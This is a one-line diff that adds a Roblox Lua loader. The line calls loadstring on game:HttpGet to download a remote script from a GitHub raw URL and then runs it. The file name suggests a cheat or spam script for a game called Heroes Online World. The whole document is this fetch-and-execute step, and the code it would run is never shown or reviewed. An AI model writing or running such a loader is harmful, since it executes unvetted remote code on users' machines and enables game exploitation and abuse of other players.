@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/dynamic-fix-heroes-online-world-spam2-9j6h95sdhbm4xk.lua"))()
